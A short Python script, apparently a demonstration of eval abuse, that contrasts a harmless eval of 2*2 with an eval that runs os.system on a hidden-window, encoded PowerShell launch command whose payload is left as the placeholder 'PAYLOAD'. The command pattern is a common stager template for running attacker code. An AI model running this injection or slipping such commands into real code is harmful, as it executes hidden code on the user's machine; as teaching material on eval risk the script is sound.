from math import *
import os
command = """powershell -noP -sta -w 1 -enc PAYLOAD 
"""
print command + "\n"
input1 = "os.system('"+command.rstrip()+"'), {}"
input2 = "eval('dir(os_call.system())', {'os_call': os})"
four = 2*2
print("Nomral Output from Eval on String\n")
print(eval(str(four)))
print("Abuse Of Eval Example\n")
print(eval(input1))
